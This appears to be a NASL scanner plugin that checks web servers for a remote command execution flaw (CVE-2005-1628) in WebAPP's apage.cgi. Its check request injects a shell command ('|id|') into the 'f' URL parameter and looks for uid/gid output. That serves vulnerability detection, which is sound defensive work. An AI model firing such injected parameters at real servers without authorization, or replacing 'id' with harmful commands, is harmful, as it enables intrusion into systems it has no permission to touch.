if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.18292" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_cve_id( "CVE-2005-1628" );
	script_bugtraq_id( 13637 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "WebAPP Apage.CGI remote command execution flaw" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2005 David Maciejak" );
	script_family( "Web application abuses" );
	script_dependencies( "webapp_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "WebAPP/installed" );
	script_tag( name: "solution", value: "Upgrade to WebAPP version 0.9.9.2 or newer." );
	script_tag( name: "summary", value: "Due to a lack of user input validation, an attacker can exploit the
  'apage.cgi' script in the version of WebAPP on the remote host to
  execute arbitrary commands on the remote host with the privileges of the web server." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
install = get_kb_item( NASLString( "www/", port, "/webapp" ) );
if(isnull( install )){
	exit( 0 );
}
matches = eregmatch( string: install, pattern: "^(.+) under (/.*)$" );
if(!isnull( matches )){
	dir = matches[2];
	http_check_remote_code( unique_dir: dir, check_request: "/mods/apage/apage.cgi?f=file.htm.|id|", check_result: "uid=[0-9]+.*gid=[0-9]+.*", command: "id" );
}

